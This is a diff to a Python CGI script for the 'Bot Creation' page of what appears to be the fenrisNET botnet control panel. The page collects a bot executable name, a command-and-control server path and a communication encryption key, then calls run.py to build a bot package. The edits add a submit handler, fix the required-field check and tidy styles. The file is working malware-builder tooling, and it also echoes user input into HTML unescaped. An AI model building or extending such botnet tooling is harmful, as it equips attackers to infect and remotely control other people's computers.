@@ -102,6 +102,12 @@ print "runEffect();";
 print "});";
 print "$( \"#effect\" ).hide();";
 print "});";
+print "function submitForm() {"
+print "document.getElementById(\"createForm\").elements[6].disabled = true;"
+print "document.getElementById(\"createForm\").elements[6].value = 'Creating...';"
+print "document.getElementById(\"createForm\").elements[6].style = \"background: #dfe9ec; display: block; width: 100%;\""
+print "document.getElementById(\"createForm\").submit();"
+print "}"
 print "</script>"
 print "</head>"
 
@@ -112,7 +118,7 @@ print "<tr><td><img src=\"../panel/images/logocreation.png\" width=\"50%\"></td>
 print "<tr><td>"
 
 allSet = 0
-if candc != "" or execname != "" or encryption != "" and key != "":
+if candc != "" and execname != "" and encryption != "" and key != "":
     subprocess.call(["./run.py", "-a", execname, candc, key])
     allSet = 1
 
@@ -122,15 +128,15 @@ if allSet == 1:
     print "<div id=\"effect\" class=\"ui-widget-content ui-corner-all\">Bot created. Look for " + execname + ".zip " + "inside your fenrisNET folder.<br />Bot communication encryption key: " + key + "</div>"
     print "<script>setTimeout(function(){window.location.href='creation.html';}, 8000);</script>"
 else:
-    print "<div align=\"center\" style=\"font-family:  Arial, sans-serif; color: #a3a3a3; font-size: 14px;\">Bot Creation</div>"
+    print "<div align=\"center\" id=\"fontDiv\" style=\"color: #a3a3a3;\">Bot Creation</div>"
 print "</td></tr>"
 
 if os.path.isfile("config"):
-    print "<tr><td colspan=\"3\"><form method=\"GET\">"
+    print "<tr><td colspan=\"3\"><form id=\"createForm\" method=\"GET\">"
     print "<input type=\"text\" id=\"input\" name=\"execname\" placeholder=\"executable name\" value=\"" + execname + "\"></td></tr>"
     print "<tr><td colspan=\"3\"><input id=\"input\" type=\"text\" name=\"candc\" title=\"The complete server path where the orders.php file is located. (without the orders.php file itself)\" placeholder=\"c&c-server\" value=\"" + candc + "\"></td></tr>"
     print "<tr><td height=\"10px\"></td></tr>"        
-    print "<tr><td colspan=\"3\"><div style=\"font-family:  Arial, sans-serif; color: #535353; font-size: 14px;\">Generate a random communication encryption key?</div></td></tr>"
+    print "<tr><td colspan=\"3\"><div style=\"color: #535353;\" id=\"fontDiv\">Generate a random communication encryption key?</div></td></tr>"
     print "<tr><td><select id=\"encSelect\" name=\"encryption\" onchange=\"selectFunction()\">"
     print "<option value=\"y\">yes</option>"
     print "<option value=\"n\">no</option>"
@@ -139,11 +145,11 @@ if os.path.isfile("config"):
     print "<td><input type=\"text\" id=\"enc\" name=\"key\"></td><td><input type=\"button\" id=\"refButton\" value=\"generate new key\" style=\"visibility:hidden\" onclick=\"rndFunction()\"></td></tr>"
     print "<tr><td height=\"10px\"></td></tr>"	
     print "<tr><td><input style=\"display: block; width: 100%;\" id=\"loginButton\" onclick=\"window.location.href='index.html'\" type=\"button\" value=\"Back\"></td>"
-    print "<td><input id=\"loginButton\" value=\"Create\" style=\"display: block; width: 100%;\" type=\"submit\"></td><td></td></tr>"
+    print "<td><input onclick=\"submitForm();\" id=\"loginButton\" value=\"Create\" style=\"display: block; width: 100%;\" type=\"button\"></td><td></td></tr>"
     print "</form>"
 else:
     print "<tr><td>"
-    print "<div style=\"font-family:  Arial, sans-serif; color: #535353; font-size: 14px;\">Run configuration script first!</div>"
+    print "<div style=\"color: #535353;\" id=\"fontDiv\">Run configuration script first!</div>"
     print "</td></tr>"
     print "<tr><td><input style=\"display: block; width: 100%;\" id=\"loginButton\" onclick=\"window.location.href='index.html'\" type=\"button\" value=\"Back\"></td>"
 
